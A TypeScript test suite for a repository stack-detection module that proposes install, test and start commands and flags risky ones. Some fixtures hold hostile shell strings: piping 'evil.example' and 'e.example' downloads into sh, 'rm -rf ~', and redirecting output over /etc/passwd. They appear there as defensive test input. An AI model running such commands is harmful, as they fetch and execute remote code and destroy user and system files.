import assert from "node:assert/strict";
import { test } from "node:test";
import {
  checkReadinessInputs, detectStack, inputPathsToRead, readinessInputsDigest, scanShell,
  type StackDetection,
} from "./stack-detect.js";

/** Fixture helper: the key set is the file listing, the values the manifest text. */
const repo = (files: Record<string, string>, extra: string[] = []) =>
  detectStack({ files: [...Object.keys(files), ...extra], manifests: files });
const pkg = (scripts: Record<string, string>, more: Record<string, unknown> = {}) =>
  JSON.stringify({ name: "x", scripts, ...more }, null, 2);
const cmds = (d: StackDetection) => ({
  p: d.proposals.preparation?.command, t: d.proposals.test?.command, s: d.proposals.start?.command,
});
const ids = (d: StackDetection) => d.stacks.map((s) => s.id).sort();

test("node: pnpm lockfile gives frozen install, test and start with file+line", () => {
  const d = repo({ "package.json": pkg({ test: "node --test", start: "node server.js" }), "pnpm-lock.yaml": "lockfileVersion: 9\n" });
  assert.deepEqual(cmds(d), { p: "pnpm install --frozen-lockfile", t: "pnpm test", s: "pnpm start" });
  assert.equal(d.proposals.test?.source.file, "package.json");
  assert.equal(d.proposals.test?.source.line, 4);
  assert.equal(d.proposals.preparation?.source.file, "pnpm-lock.yaml");
  assert.equal(d.confidence, "high");
  assert.equal(d.conflicts.length, 0);
});

test("node: npm, yarn (classic and berry) and bun lockfiles map to their own commands", () => {
  const s = pkg({ test: "jest" });
  assert.equal(repo({ "package.json": s, "package-lock.json": "{}" }).proposals.preparation?.command, "npm ci");
  assert.equal(repo({ "package.json": s, "yarn.lock": "" }).proposals.preparation?.command, "yarn install --frozen-lockfile");
  assert.equal(repo({ "package.json": s, "yarn.lock": "", ".yarnrc.yml": "" }).proposals.preparation?.command, "yarn install --immutable");
  const bun = repo({ "package.json": s, "bun.lock": "" });
  assert.equal(bun.proposals.preparation?.command, "bun install --frozen-lockfile");
  assert.equal(bun.proposals.test?.command, "bun run test", "`bun test` would run bun's own runner");
});

test("node: packageManager field alone is evidence, with a non-frozen install", () => {
  const d = repo({ "package.json": pkg({ test: "vitest run" }, { packageManager: "pnpm@9.1.0" }) });
  assert.equal(d.proposals.preparation?.command, "pnpm install");
  assert.equal(d.proposals.preparation?.source.claim, "packageManager field");
});

test("node: no lockfile and no packageManager means unknown, nothing proposed", () => {
  const d = repo({ "package.json": pkg({ test: "jest", start: "node ." }) });
  assert.deepEqual(d.proposals, {});
  assert.deepEqual(d.unknown.map((u) => u.field).sort(), ["preparation", "start", "test"]);
  assert.equal(d.confidence, "low");
});

test("node: npm placeholder test script and dev-only scripts are not proposed", () => {
  const d = repo({
    "package.json": pkg({ test: 'echo "Error: no test specified" && exit 1', dev: "vite" }),
    "package-lock.json": "{}",
  });
  assert.equal(d.proposals.test, undefined);
  assert.equal(d.proposals.start, undefined);
  assert.match(d.unknown.find((u) => u.field === "test")!.reason, /placeholder/);
  assert.match(d.unknown.find((u) => u.field === "start")!.reason, /dev/);
  assert.equal(d.proposals.preparation?.command, "npm ci");
});

test("conflicting lockfiles: reported with both options, nothing proposed (negative control: single lockfile proposes)", () => {
  const files = { "package.json": pkg({ test: "jest" }), "package-lock.json": "{}", "pnpm-lock.yaml": "" };
  const d = repo(files);
  assert.deepEqual(d.proposals, {});
  const prep = d.conflicts.find((c) => c.field === "preparation")!;
  assert.deepEqual(prep.options.map((o) => o.command).sort(), ["npm ci", "pnpm install --frozen-lockfile"]);
  assert.match(prep.reason, /multiple lockfiles/);
  assert.equal(d.confidence, "low");
  assert.deepEqual(d.validation.steps, []);
  assert.equal(d.validation.blockedBy.filter((b) => b.reason.includes("multiple lockfiles")).length, 2, "start has no script, so it is unknown rather than conflicted");
  const single = repo({ "package.json": files["package.json"], "pnpm-lock.yaml": "" });
  assert.equal(single.conflicts.length, 0);
});

test("node: packageManager disagreeing with the lockfile is a conflict", () => {
  const d = repo({ "package.json": pkg({ test: "x" }, { packageManager: "yarn@1.22.0" }), "pnpm-lock.yaml": "" });
  assert.equal(d.proposals.preparation, undefined);
  assert.equal(d.conflicts.find((c) => c.field === "preparation")!.options.length, 2);
});

test("python: uv, poetry and pip fixtures with pytest", () => {
  const uv = repo({ "pyproject.toml": "[project]\nrequires-python = \">=3.11\"\n[tool.pytest.ini_options]\n", "uv.lock": "" });
  assert.deepEqual(cmds(uv), { p: "uv sync --frozen", t: "uv run pytest", s: undefined });
  assert.equal(uv.proposals.test?.source.line, 3);
  assert.equal(uv.stacks[0].version?.value, ">=3.11");
  const poetry = repo({ "pyproject.toml": "[tool.poetry]\nname='a'\n", "poetry.lock": "", "pytest.ini": "[pytest]\n" });
  assert.deepEqual(cmds(poetry), { p: "poetry install --no-interaction", t: "poetry run pytest", s: undefined });
  const pip = repo({ "requirements.txt": "flask\npytest>=8\n" });
  assert.deepEqual(cmds(pip), { p: "pip install -r requirements.txt", t: "pytest", s: undefined });
  assert.equal(pip.proposals.test?.source.line, 2);
});

test("python: unittest only when a test module imports it; otherwise test is unknown", () => {
  const ut = repo({ "requirements.txt": "flask\n", "tests/test_a.py": "import unittest\n" });
  assert.equal(ut.proposals.test?.command, "python -m unittest discover");
  const none = repo({ "requirements.txt": "flask\n" }, ["tests/test_a.py"]);
  assert.equal(none.proposals.test, undefined);
  assert.ok(none.unknown.some((u) => u.field === "test"));
});

test("python: poetry plus requirements.txt is a conflict, not a pick", () => {
  const d = repo({ "pyproject.toml": "[tool.poetry]\n[tool.pytest.ini_options]\n", "poetry.lock": "", "requirements.txt": "pytest\n" });
  assert.equal(d.proposals.preparation, undefined);
  assert.equal(d.proposals.test, undefined);
  assert.equal(d.conflicts.find((c) => c.field === "test")!.options.length, 2);
});

test("python: bare pyproject with no installer evidence proposes no preparation", () => {
  const d = repo({ "pyproject.toml": "[project]\nname='a'\n" });
  assert.equal(d.proposals.preparation, undefined);
  assert.ok(d.unknown.some((u) => u.field === "preparation"));
});

test("go", () => {
  const d = repo({ "go.mod": "module example.com/a\n\ngo 1.22\n", "main.go": "package main\n" });
  assert.deepEqual(cmds(d), { p: "go mod download", t: "go test ./...", s: "go run ." });
  assert.equal(d.stacks[0].version?.value, "1.22");
  assert.equal(repo({ "go.mod": "module a\n" }).proposals.start, undefined);
});

test("rust: package vs virtual workspace", () => {
  const pk = repo({ "Cargo.toml": "[package]\nname='a'\n", "Cargo.lock": "", "src/main.rs": "fn main(){}" });
  assert.deepEqual(cmds(pk), { p: "cargo fetch --locked", t: "cargo test", s: "cargo run" });
  const ws = repo({ "Cargo.toml": "[workspace]\nmembers=['a','b']\n" }, ["a/Cargo.toml", "b/Cargo.toml"]);
  assert.equal(ws.proposals.test?.command, "cargo test --workspace");
  assert.equal(ws.proposals.start, undefined);
  assert.equal(ws.monorepo?.kinds[0], "cargo-workspace");
  assert.deepEqual(ws.monorepo?.packages, ["a", "b"]);
});

test("java: maven wrapper, gradle, and both together as a conflict", () => {
  const mvn = repo({ "pom.xml": "<project/>" }, ["mvnw"]);
  assert.deepEqual(cmds(mvn), { p: "./mvnw -B dependency:go-offline", t: "./mvnw -B test", s: undefined });
  assert.equal(mvn.proposals.preparation?.timeoutMs, 600_000);
  const gr = repo({ "build.gradle.kts": "plugins{}", "settings.gradle.kts": "rootProject.name='a'\ninclude(\"x\")\n" }, ["gradlew"]);
  assert.equal(gr.proposals.test?.command, "./gradlew --no-daemon test");
  assert.equal(gr.monorepo?.kinds[0], "gradle-multiproject");
  const both = repo({ "pom.xml": "<project/>", "build.gradle": "" });
  assert.equal(both.proposals.test, undefined);
  assert.equal(both.conflicts.find((c) => c.field === "test")!.options.length, 2);
});

test("ruby: rspec, rake test, both (conflict), neither (unknown)", () => {
  assert.equal(repo({ Gemfile: "source 'x'\n", ".rspec": "--color\n" }).proposals.test?.command, "bundle exec rspec");
  assert.equal(repo({ Gemfile: "x\n", Rakefile: "" }, ["test/a_test.rb"]).proposals.test?.command, "bundle exec rake test");
  const both = repo({ Gemfile: "x\n", ".rspec": "", Rakefile: "" }, ["test/a_test.rb"]);
  assert.equal(both.proposals.test, undefined);
  assert.equal(both.conflicts.find((c) => c.field === "test")!.options.length, 2);
  const none = repo({ Gemfile: "x\n" });
  assert.equal(none.proposals.test, undefined);
  assert.equal(none.proposals.preparation?.command, "bundle install");
});

test("php: composer scripts.test beats phpunit.xml; phpunit.xml alone works; invalid JSON is unknown", () => {
  const a = repo({ "composer.json": JSON.stringify({ scripts: { test: "phpunit" } }, null, 1), "phpunit.xml": "" });
  assert.equal(a.proposals.test?.command, "composer test");
  assert.equal(repo({ "composer.json": "{}", "phpunit.xml.dist": "" }).proposals.test?.command, "vendor/bin/phpunit");
  const bad = repo({ "composer.json": "{ not json" });
  assert.deepEqual(bad.proposals, {});
  assert.ok(bad.unknown.some((u) => u.field === "stack"));
});

test("static site: recognised, nothing proposed; index.html next to a manifest is not static", () => {
  const d = repo({ "index.html": "<html>" });
  assert.deepEqual(ids(d), ["static"]);
  assert.deepEqual(d.proposals, {});
  assert.equal(d.unknown.length, 3);
  assert.ok(!ids(repo({ "index.html": "", "go.mod": "module a\n" })).includes("static"));
});

test("compose: declared services, images, tags, kinds, and risk flags; env hints are marked undeclared", () => {
  const compose = [
    "services:", "  db:", "    image: postgres:16-alpine", "  cache:", "    image: \"redis:7\"",
    "  app:", "    build: .", "    privileged: true", "    volumes:", "      - /var/run/docker.sock:/var/run/docker.sock",
    "  q:", "    image: ghcr.io/acme/rabbitmq:3", "volumes:", "  x:", "",
  ].join("\n");
  const d = repo({ "docker-compose.yml": compose, Dockerfile: "FROM node:20\n", ".env.example": "MONGODB_URI=mongodb://x\nDATABASE_URL=postgres://x\n" });
  const by = Object.fromEntries(d.services.map((s) => [s.name, s]));
  assert.equal(by.db.kind, "postgres");
  assert.equal(by.db.tag, "16-alpine");
  assert.equal(by.db.source.line, 2);
  assert.equal(by.cache.kind, "redis");
  assert.equal(by.q.kind, "rabbitmq");
  assert.deepEqual(by.app.risks.sort(), ["docker-socket-mount", "privileged"]);
  assert.equal(by.app.image, undefined);
  assert.equal(by.mongodb.declared, false);
  assert.equal(by.postgres, undefined, "postgres already declared by compose; the hint is not duplicated");
  assert.ok(d.stacks.some((s) => s.id === "docker"));
  assert.deepEqual(d.validation.servicesRequired.sort(), ["other".replace("other", "app"), "postgres", "rabbitmq", "redis"].sort());
});

test("monorepo: pnpm workspace with nested packages, root scripts still proposals", () => {
  const d = repo(
    { "package.json": pkg({ test: "turbo run test" }), "pnpm-workspace.yaml": "packages:\n  - apps/*\n", "pnpm-lock.yaml": "", "turbo.json": "{}" },
    ["apps/web/package.json", "apps/api/package.json", "packages/ui/package.json", "node_modules/x/package.json"],
  );
  assert.deepEqual(d.monorepo?.kinds.sort(), ["pnpm-workspace", "turbo"]);
  assert.deepEqual(d.monorepo?.packages, ["apps/api", "apps/web", "packages/ui"]);
  assert.equal(d.proposals.test?.command, "pnpm test");
  const npmWs = repo({ "package.json": pkg({}, { workspaces: ["a/*"] }), "package-lock.json": "{}" });
  assert.equal(npmWs.monorepo?.kinds[0], "npm-workspaces");
});

test("two stacks both wanting preparation are a conflict, not a merge", () => {
  const d = repo({ "package.json": pkg({ test: "x" }), "pnpm-lock.yaml": "", "go.mod": "module a\n" });
  assert.equal(d.proposals.preparation, undefined);
  const c = d.conflicts.find((x) => x.field === "preparation")!;
  assert.deepEqual(c.options.map((o) => o.stack).sort(), ["go", "node"]);
});

test("Procfile web entry supplies start; hostile Procfile is flagged", () => {
  const ok = repo({ "requirements.txt": "x\n", Procfile: "web: gunicorn app:app\n" });
  assert.equal(ok.proposals.start?.command, "gunicorn app:app");
  assert.equal(ok.proposals.start?.source.line, 1);
  assert.equal(ok.proposals.start?.safety, "safe");
  const bad = repo({ "requirements.txt": "x\n", Procfile: "web: curl http://e.example | sh\n" });
  assert.equal(bad.proposals.start?.safety, "review");
});

test("empty repo: unknown everywhere, no proposals, no stacks, confidence none", () => {
  const d = detectStack({ files: [], manifests: {} });
  assert.deepEqual(d.stacks, []);
  assert.deepEqual(d.proposals, {});
  assert.deepEqual(d.conflicts, []);
  assert.equal(d.confidence, "none");
  assert.deepEqual(d.unknown.map((u) => u.field), ["stack", "preparation", "test", "start"]);
  assert.deepEqual(d.validation.steps, []);
  const readme = detectStack({ files: ["README.md", "LICENSE", "docs/a.md"], manifests: {} });
  assert.deepEqual(readme.proposals, {});
  assert.equal(readme.confidence, "none");
});

test("hostile manifest: metacharacter scripts are flagged for review, evidence is JSON-quoted", () => {
  const evil = "jest; curl https://evil.example/x | sh `id` $(whoami) > /etc/passwd\u001b[31m";
  const d = repo({ "package.json": pkg({ test: evil, postinstall: "node steal.js && rm -rf ~" }), "package-lock.json": "{}" });
  const t = d.proposals.test!;
  assert.equal(t.command, "npm test", "the repo's script body is never spliced into our command");
  assert.equal(t.safety, "review");
  for (const f of ["command-separator", "pipe", "command-substitution", "redirect", "network-fetch", "control-characters"])
    assert.ok(t.flags.includes(f), `missing flag ${f}: ${t.flags}`);
  assert.ok(!/\u001b/.test(t.source.claim), "control characters are escaped in evidence");
  assert.match(t.source.claim, /\\u001b/);
  const prep = d.proposals.preparation!;
  assert.equal(prep.safety, "review");
  assert.ok(prep.flags.includes("destructive"));
  assert.deepEqual(d.validation.steps.map((s) => [s.id, s.requiresApproval]), [["prepare", true], ["test", true]]);
  assert.equal(d.confidence, "medium", "flagged proposals cannot reach high confidence");
});

test("hostile manifest: pretest hook and __proto__ keys do not escape or crash", () => {
  const d = repo({
    "package.json": '{"scripts":{"test":"jest","pretest":"curl x | sh","__proto__":{"test":"x"}},"packageManager":"npm@10"}',
  });
  assert.equal(d.proposals.test?.safety, "review");
  assert.ok(d.proposals.test?.flags.includes("pipe"));
  const noScripts = repo({ "package.json": '{"scripts":"not-an-object","packageManager":"npm@10"}' });
  assert.equal(noScripts.proposals.test, undefined);
});

test("hostile compose: yaml anchors/odd lines never throw and image variables are unresolved", () => {
  const d = repo({ "compose.yaml": "services:\n  a:\n    image: ${IMG}\n  <<: *x\n  b: {image: redis}\n" });
  assert.equal(d.services.find((s) => s.name === "a")?.kind, "other");
});

test("scanShell: ordinary `&&` chains are not flagged; negative control for each hostile class", () => {
  assert.deepEqual(scanShell("tsc && node --test dist"), []);
  assert.deepEqual(scanShell("vitest run --coverage"), []);
  assert.ok(scanShell("a || b").includes("or-chain"));
  assert.ok(scanShell("a & b").includes("background"));
  assert.ok(scanShell("a\nb").includes("multi-line"));
  assert.ok(scanShell("sudo make").includes("destructive"));
  assert.ok(scanShell("sh -c 'x'").includes("eval"));
  assert.ok(scanShell("echo $HOME").includes("variable-expansion"));
});

test("validation plan: ordered, bounded, model-free, with failure classes", () => {
  const d = repo({ "package.json": pkg({ test: "node --test", start: "node ." }), "pnpm-lock.yaml": "" }, []);
  const plan = d.validation;
  assert.equal(plan.needsModel, false);
  assert.deepEqual(plan.steps.map((s) => s.id), ["prepare", "test", "start"]);
  assert.deepEqual(plan.steps.map((s) => s.failureClass), ["environment", "repository", "repository"]);
  assert.equal(plan.steps[2].expect, "alive-at-timeout");
  for (const s of plan.steps) {
    assert.ok(Number.isInteger(s.timeoutMs) && s.timeoutMs >= 1000 && s.timeoutMs <= 900_000, "within normalizePreparation bounds");
    assert.ok(s.pass && s.fail && s.source.file);
    assert.equal(s.requiresApproval, false);
  }
  assert.deepEqual(plan.blockedBy, []);
});

test("inputPathsToRead lists only well-known files that exist", () => {
  const r = inputPathsToRead(["package.json", "pnpm-lock.yaml", "src/index.ts", "./Dockerfile", "yarn.lock"]);
  assert.deepEqual(r.manifests, ["package.json", "Dockerfile"]);
  assert.deepEqual(r.lockfiles, ["pnpm-lock.yaml", "yarn.lock"]);
});

test("readinessInputsDigest: deterministic, order-independent, sensitive to every input", () => {
  const base = {
    manifests: { "package.json": "{}", "a/package.json": "{1}" },
    lockfiles: { "pnpm-lock.yaml": "lock" },
    recipe: "pnpm install --frozen-lockfile\npnpm test",
    image: "sha256:aaa",
  };
  const d0 = readinessInputsDigest(base);
  assert.match(d0.digest, /^[0-9a-f]{64}$/);
  const reordered = readinessInputsDigest({ ...base, manifests: { "a/package.json": "{1}", "package.json": "{}" } });
  assert.equal(reordered.digest, d0.digest);
  assert.equal(readinessInputsDigest({ ...base, manifests: { "./package.json": "{}", "a/package.json": "{1}" } }).digest, d0.digest);
  const variants = [
    { ...base, manifests: { ...base.manifests, "package.json": "{ }" } },
    { ...base, lockfiles: { "pnpm-lock.yaml": "lock2" } },
    { ...base, recipe: base.recipe + " " },
    { ...base, image: "sha256:bbb" },
    { ...base, config: { env: "A,B" } },
    { ...base, manifests: { "package.json": "{}" } },
    { ...base, lockfiles: { "yarn.lock": "lock" } },
  ];
  const seen = new Set([d0.digest]);
  for (const v of variants) seen.add(readinessInputsDigest(v).digest);
  assert.equal(seen.size, variants.length + 1, "every variant produces a distinct digest");
});

test("readinessInputsDigest: moving bytes between path and content cannot collide", () => {
  const a = readinessInputsDigest({ manifests: { a: "bc" } });
  const b = readinessInputsDigest({ manifests: { ab: "c" } });
  assert.notEqual(a.digest, b.digest);
  const k1 = readinessInputsDigest({ manifests: { x: "y" } });
  const k2 = readinessInputsDigest({ lockfiles: { x: "y" } });
  assert.notEqual(k1.digest, k2.digest, "kind is part of the identity");
});

test("checkReadinessInputs: fresh when identical, stale naming what changed/added/removed", () => {
  const inputs = { manifests: { "package.json": "{}" }, lockfiles: { "pnpm-lock.yaml": "L" }, recipe: "r", image: "i" };
  const rec = readinessInputsDigest(inputs);
  assert.deepEqual(checkReadinessInputs(rec, inputs), { status: "fresh", changed: [], added: [], removed: [] });
  const lock = checkReadinessInputs(rec, { ...inputs, lockfiles: { "pnpm-lock.yaml": "L2" } });
  assert.equal(lock.status, "stale");
  assert.deepEqual(lock.changed, ["lockfile:pnpm-lock.yaml"]);
  const recipe = checkReadinessInputs(rec, { ...inputs, recipe: "r2" });
  assert.deepEqual(recipe.changed, ["recipe"]);
  const img = checkReadinessInputs(rec, { ...inputs, image: "j" });
  assert.deepEqual(img.changed, ["image"]);
  const swap = checkReadinessInputs(rec, { manifests: inputs.manifests, lockfiles: { "yarn.lock": "L" }, recipe: "r", image: "i" });
  assert.deepEqual([swap.added, swap.removed], [["lockfile:yarn.lock"], ["lockfile:pnpm-lock.yaml"]]);
  const dropped = checkReadinessInputs(rec, { ...inputs, image: undefined });
  assert.equal(dropped.status, "stale");
});

test("detection is pure: input objects are not mutated and results are repeatable", () => {
  const input = { files: ["package.json", "pnpm-lock.yaml"], manifests: { "package.json": pkg({ test: "x" }) } };
  const snap = JSON.stringify(input);
  const a = detectStack(input);
  const b = detectStack(input);
  assert.equal(JSON.stringify(input), snap);
  assert.deepEqual(a, b);
});
